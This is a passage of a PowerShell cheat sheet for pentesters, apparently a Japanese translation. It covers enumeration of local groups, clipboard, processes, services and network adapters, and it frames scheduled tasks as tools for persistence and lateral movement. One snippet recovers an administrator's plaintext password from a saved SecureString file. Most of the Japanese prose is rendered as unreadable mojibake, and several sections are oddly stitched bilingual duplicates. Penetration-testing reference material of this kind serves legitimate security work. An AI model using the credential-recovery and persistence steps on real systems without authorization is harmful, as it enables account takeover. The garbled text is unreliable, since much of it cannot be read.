ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Powershellã‚’ä»‹ã—ã¦Windowsã®ã‚°ãƒ«ãƒ¼ãƒ—ã‚’åŠ¹æœçš„ã«ç®¡ç†ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰

ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ä¸Šã§ãƒ‡ãƒ¼ã‚¿ã‚’ä¸€æ™‚çš„ã«ä¿å­˜ã™ã‚‹ãŸã‚ã®æ©Ÿèƒ½ã§ã™ã€‚ä¸€èˆ¬çš„ã«ã¯ã€ãƒ†ã‚­ã‚¹ãƒˆã‚„ç”»åƒãªã©ã®ãƒ‡ãƒ¼ã‚¿ã‚’ã‚³ãƒ”ãƒ¼ã—ã¦åˆ¥ã®å ´æ‰€ã«è²¼ã‚Šä»˜ã‘ã‚‹éš›ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«ã¯ã€Windows PowerShellã‚’ä½¿ç”¨ã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã«ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’æ“ä½œã™ã‚‹ãŸã‚ã®åŸºæœ¬çš„ãªPowerShellã‚³ãƒãƒ³ãƒ‰ã®ä¾‹ã‚’ç¤ºã—ã¾ã™ã€‚

### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã«ãƒ†ã‚­ã‚¹ãƒˆã‚’ã‚³ãƒ”ãƒ¼ã™ã‚‹

```powershell
Set-Clipboard -Value "ã‚³ãƒ”ãƒ¼ã™ã‚‹ãƒ†ã‚­ã‚¹ãƒˆ"
```

### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‹ã‚‰ãƒ†ã‚­ã‚¹ãƒˆã‚’å–å¾—ã™ã‚‹

```powershell
$clipboardText = Get-Clipboard
```

### ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã®å†…å®¹ã‚’ã‚¯ãƒªã‚¢ã™ã‚‹

```powershell
Clear-Clipboard
```

ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€PowerShellã‚’ä»‹ã—ã¦ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’æ“ä½œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚„ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã€ã‚¯ãƒªãƒƒãƒ—ãƒœãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã—ãŸã‚Šã€æ©Ÿå¯†æƒ…å ±ã‚’ã‚¯ãƒªã‚¢ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«å½¹ç«‹ã¡ã¾ã™ã€‚
```powershell
Get-Clipboard
```
## ãƒ—ãƒ­ã‚»ã‚¹

### Introduction

ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ã™ã€‚Windowsã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹ã¯ã‚·ã‚¹ãƒ†ãƒ ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã¯ã€ãƒ¡ãƒ¢ãƒªã€CPUæ™‚é–“ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šãªã©ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’æ¶ˆè²»ã—ã¾ã™ã€‚

### ãƒ—ãƒ­ã‚»ã‚¹ã®è¡¨ç¤º

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã‚’è¡¨ç¤ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-Process
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€å®Ÿè¡Œä¸­ã®ã™ã¹ã¦ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã—ã¾ã™ã€‚å„ãƒ—ãƒ­ã‚»ã‚¹ã«ã¯ã€ãƒ—ãƒ­ã‚»ã‚¹IDã€ãƒ—ãƒ­ã‚»ã‚¹åã€ãƒ¡ãƒ¢ãƒªä½¿ç”¨é‡ãªã©ã®æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

### ç‰¹å®šã®ãƒ—ãƒ­ã‚»ã‚¹ã®è¡¨ç¤º

ç‰¹å®šã®ãƒ—ãƒ­ã‚»ã‚¹ã®è©³ç´°æƒ…å ±ã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€`Get-Process`ã‚³ãƒãƒ³ãƒ‰ã«ãƒ—ãƒ­ã‚»ã‚¹åã‚’æŒ‡å®šã—ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-Process -Name <ãƒ—ãƒ­ã‚»ã‚¹å>
```

`<ãƒ—ãƒ­ã‚»ã‚¹å>`ã®éƒ¨åˆ†ã«ã¯ã€è¡¨ç¤ºã—ãŸã„ãƒ—ãƒ­ã‚»ã‚¹ã®åå‰ã‚’å…¥åŠ›ã—ã¾ã™ã€‚

### ãƒ—ãƒ­ã‚»ã‚¹ã®çµ‚äº†

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€ãƒ—ãƒ­ã‚»ã‚¹ã‚’çµ‚äº†ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Stop-Process -Name <ãƒ—ãƒ­ã‚»ã‚¹å>
```

`<ãƒ—ãƒ­ã‚»ã‚¹å>`ã®éƒ¨åˆ†ã«ã¯ã€çµ‚äº†ã•ã›ãŸã„ãƒ—ãƒ­ã‚»ã‚¹ã®åå‰ã‚’å…¥åŠ›ã—ã¾ã™ã€‚

### ãƒ—ãƒ­ã‚»ã‚¹ã®ä½œæˆ

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€æ–°ã—ã„ãƒ—ãƒ­ã‚»ã‚¹ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Start-Process -FilePath <ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹>
```

`<ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹>`ã®éƒ¨åˆ†ã«ã¯ã€å®Ÿè¡Œã—ãŸã„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®ãƒ•ã‚¡ã‚¤ãƒ«ãƒ‘ã‚¹ã‚’å…¥åŠ›ã—ã¾ã™ã€‚

### ãƒ—ãƒ­ã‚»ã‚¹ã®ç›£è¦–

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€ãƒ—ãƒ­ã‚»ã‚¹ã®ç›£è¦–ã‚‚è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚

```powershell
Get-Process | Where-Object {$_.Name -eq "<ãƒ—ãƒ­ã‚»ã‚¹å>"}
```

`<ãƒ—ãƒ­ã‚»ã‚¹å>`ã®éƒ¨åˆ†ã«ã¯ã€ç›£è¦–ã—ãŸã„ãƒ—ãƒ­ã‚»ã‚¹ã®åå‰ã‚’å…¥åŠ›ã—ã¾ã™ã€‚

ä»¥ä¸ŠãŒã€PowerShellã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚»ã‚¹ã‚’è¡¨ç¤ºã€çµ‚äº†ã€ä½œæˆã€ç›£è¦–ã™ã‚‹æ–¹æ³•ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ã£ã¦ã€ãƒ—ãƒ­ã‚»ã‚¹ã«é–¢ã™ã‚‹æƒ…å ±ã‚’å–å¾—ã—ã€å¿…è¦ãªæ“ä½œã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## ã‚µãƒ¼ãƒ“ã‚¹

### Introduction

This section provides an overview of various services that can be used for basic PowerShell for pentesters.

### ã¯ã˜ã‚ã«

ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€åŸºæœ¬çš„ãªPowerShellã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã®ã•ã¾ã–ã¾ãªã‚µãƒ¼ãƒ“ã‚¹ã«ã¤ã„ã¦æ¦‚èª¬ã—ã¾ã™ã€‚

### 1. PowerShell Remoting

PowerShell Remoting allows remote execution of PowerShell commands on a target machine.

1. PowerShellãƒªãƒ¢ãƒ¼ãƒˆ

PowerShellãƒªãƒ¢ãƒ¼ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆãƒã‚·ãƒ³ã§PowerShellã‚³ãƒãƒ³ãƒ‰ã‚’ãƒªãƒ¢ãƒ¼ãƒˆã§å®Ÿè¡Œã§ãã¾ã™ã€‚

### 2. Windows Management Instrumentation (WMI)

WMI provides a set of management information and control capabilities for Windows-based operating systems.

2. Windows Management Instrumentation (WMI)

WMIã¯ã€Windowsãƒ™ãƒ¼ã‚¹ã®ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã®ç®¡ç†æƒ…å ±ã¨åˆ¶å¾¡æ©Ÿèƒ½ã®ã‚»ãƒƒãƒˆã‚’æä¾›ã—ã¾ã™ã€‚

### 3. Active Directory Services Interface (ADSI)

ADSI allows management of directory services, such as users, groups, and computers, in a Windows environment.

3. Active Directory Services Interface (ADSI)

ADSIã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Windowsç’°å¢ƒã§ãƒ¦ãƒ¼ã‚¶ãƒ¼ã€ã‚°ãƒ«ãƒ¼ãƒ—ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ãªã©ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚µãƒ¼ãƒ“ã‚¹ã‚’ç®¡ç†ã§ãã¾ã™ã€‚

### 4. Windows Registry

The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system and installed applications.

4. Windows Registry

Windowsãƒ¬ã‚¸ã‚¹ãƒˆãƒªã¯ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã¨ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è¨­å®šã¨ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æ ¼ç´ã™ã‚‹éšå±¤å‹ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã§ã™ã€‚

### 5. Windows Event Logs

Windows Event Logs record significant events on a Windows system, such as system startup, user logon, and application crashes.

5. Windows Event Logs

Windowsã‚¤ãƒ™ãƒ³ãƒˆãƒ­ã‚°ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ã®èµ·å‹•ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãƒ­ã‚°ã‚ªãƒ³ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ã‚¯ãƒ©ãƒƒã‚·ãƒ¥ãªã©ã€Windowsã‚·ã‚¹ãƒ†ãƒ ä¸Šã®é‡è¦ãªã‚¤ãƒ™ãƒ³ãƒˆã‚’è¨˜éŒ²ã—ã¾ã™ã€‚

### 6. Windows Task Scheduler

The Windows Task Scheduler allows the scheduling and automation of tasks to be performed on a Windows system.

6. Windows Task Scheduler

Windowsã‚¿ã‚¹ã‚¯ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ©ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã§ã‚¿ã‚¹ã‚¯ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã¨è‡ªå‹•åŒ–ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

### 7. Windows Services

Windows Services are background processes that run independently of the logged-in user and provide various system functions.

7. Windows Services

Windowsã‚µãƒ¼ãƒ“ã‚¹ã¯ã€ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨ã¯ç‹¬ç«‹ã—ã¦å®Ÿè¡Œã•ã‚Œã€ã•ã¾ã–ã¾ãªã‚·ã‚¹ãƒ†ãƒ æ©Ÿèƒ½ã‚’æä¾›ã™ã‚‹ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ãƒ—ãƒ­ã‚»ã‚¹ã§ã™ã€‚

### 8. Windows Management Instrumentation Command-line (WMIC)

WMIC is a command-line interface for WMI, allowing the execution of WMI queries and commands.

8. Windows Management Instrumentation Command-line (WMIC)

WMICã¯ã€WMIã®ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã§ã‚ã‚Šã€WMIã‚¯ã‚¨ãƒªã¨ã‚³ãƒãƒ³ãƒ‰ã®å®Ÿè¡Œã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚
```
Get-Service
```
## ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹

PowerShellã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹æ–¹æ³•ã‚’å­¦ã³ã¾ã™ã€‚

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$password = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

ä¸Šè¨˜ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€`ConvertTo-SecureString`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’ä½œæˆã—ã¾ã™ã€‚`-String`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã¯ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒ‡å®šã—ã¾ã™ã€‚`-AsPlainText`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’å¹³æ–‡ã«å¤‰æ›ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚`-Force`ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€å¤‰æ›ã‚’å¼·åˆ¶ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

æ¬¡ã«ã€`[Runtime.InteropServices.Marshal]::SecureStringToBSTR`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‚’BSTRï¼ˆãƒã‚¤ãƒŠãƒªã‚¹ãƒˆãƒªãƒ³ã‚°ï¼‰ã«å¤‰æ›ã—ã¾ã™ã€‚ãã®å¾Œã€`[Runtime.InteropServices.Marshal]::PtrToStringAuto`ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€BSTRã‚’æ–‡å­—åˆ—ã«å¤‰æ›ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå–å¾—ã•ã‚Œã¾ã™ã€‚

ã“ã®æ–¹æ³•ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã‚»ã‚­ãƒ¥ã‚¢ãªæ–‡å­—åˆ—ã‹ã‚‰ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts or programs at specific times or intervals. As a pentester, understanding how to leverage scheduled tasks can be beneficial for persistence, privilege escalation, and lateral movement.

ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã¯ã€ç‰¹å®šã®æ™‚é–“ã‚„é–“éš”ã§ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã®Windowsã®å¼·åŠ›ãªæ©Ÿèƒ½ã§ã™ã€‚ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã¨ã—ã¦ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’æ´»ç”¨ã™ã‚‹æ–¹æ³•ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯ã€æŒç¶šæ€§ã€ç‰¹æ¨©ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã€ãŠã‚ˆã³æ¨ªæ–¹å‘ã®ç§»å‹•ã«ãŠã„ã¦æœ‰ç›Šã§ã™ã€‚

### Viewing Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®è¡¨ç¤º

To view the list of scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves all the scheduled tasks on the local system.

Windowsã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ãƒªã‚¹ãƒˆã‚’è¡¨ç¤ºã™ã‚‹ã«ã¯ã€PowerShellã®`Get-ScheduledTask`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã™ã¹ã¦ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å–å¾—ã—ã¾ã™ã€‚

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®ä½œæˆ

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script or program to be executed, the trigger that defines when the task should run, and other settings such as the user account under which the task should run.

æ–°ã—ã„ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’ä½œæˆã™ã‚‹ã«ã¯ã€PowerShellã®`New-ScheduledTask`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€å®Ÿè¡Œã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã€ã‚¿ã‚¹ã‚¯ã®å®Ÿè¡Œæ™‚æœŸã‚’å®šç¾©ã™ã‚‹ãƒˆãƒªã‚¬ãƒ¼ã€ãŠã‚ˆã³ã‚¿ã‚¹ã‚¯ã®å®Ÿè¡Œã«ä½¿ç”¨ã™ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãªã©ã®ä»–ã®è¨­å®šã‚’æŒ‡å®šã§ãã¾ã™ã€‚

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am) -User "DOMAIN\username" -Password "password"
```

### Modifying Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®å¤‰æ›´

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script or program to be executed, the trigger, and the user account.

æ—¢å­˜ã®ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã«ã¯ã€PowerShellã®`Set-ScheduledTask`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€å®Ÿè¡Œã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã€ãƒˆãƒªã‚¬ãƒ¼ã€ãŠã‚ˆã³ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãªã©ã€ã‚¿ã‚¹ã‚¯ã®ã•ã¾ã–ã¾ãªãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚

```powershell
Set-ScheduledTask -TaskPath "\Microsoft\Windows\PowerShell\ScheduledJobs" -TaskName "MyTask" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 4am)
```

### Deleting Scheduled Tasks

### ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®å‰Šé™¤

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã‚’å‰Šé™¤ã™ã‚‹ã«ã¯ã€PowerShellã®`Unregister-ScheduledTask`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€æŒ‡å®šã—ãŸã‚¿ã‚¹ã‚¯ã‚’ã‚·ã‚¹ãƒ†ãƒ ã‹ã‚‰å‰Šé™¤ã—ã¾ã™ã€‚

```powershell
Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\PowerShell\ScheduledJobs" -TaskName "MyTask"
```

### Conclusion

### çµè«–

Scheduled tasks are a useful feature in Windows for automating the execution of scripts or programs. As a pentester, understanding how to view, create, modify, and delete scheduled tasks can be valuable for various purposes during an engagement.

ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã¯ã€ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚„ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®å®Ÿè¡Œã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã®Windowsã®ä¾¿åˆ©ãªæ©Ÿèƒ½ã§ã™ã€‚ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã¨ã—ã¦ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã•ã‚ŒãŸã‚¿ã‚¹ã‚¯ã®è¡¨ç¤ºã€ä½œæˆã€å¤‰æ›´ã€å‰Šé™¤æ–¹æ³•ã‚’ç†è§£ã™ã‚‹ã“ã¨ã¯ã€ã‚¨ãƒ³ã‚²ãƒ¼ã‚¸ãƒ¡ãƒ³ãƒˆä¸­ã«ã•ã¾ã–ã¾ãªç›®çš„ã§ä¾¡å€¤ãŒã‚ã‚Šã¾ã™ã€‚
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
## ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯

### ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹

```powershell
Get-NetAdapter
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚·ã‚¹ãƒ†ãƒ ä¸Šã®ã™ã¹ã¦ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Select-Object Name, InterfaceDescription, MacAddress, Status
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®åå‰ã€èª¬æ˜ã€MACã‚¢ãƒ‰ãƒ¬ã‚¹ã€ãŠã‚ˆã³ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Where-Object {$_.Status -eq 'Up'}
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ãŒã€ŒUpã€ï¼ˆã‚¢ãƒƒãƒ—ï¼‰ã®ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Where-Object {$_.InterfaceDescription -like '*Ethernet*'}
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®èª¬æ˜ã«ã€ŒEthernetã€ãŒå«ã¾ã‚Œã‚‹ã‚¤ãƒ³ã‚¿ãƒ¼ãƒ•ã‚§ãƒ¼ã‚¹ã®ã¿ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚

```powershell
Get-NetAdapter | Where-Object {$_.MacAddress -ne $null}
```

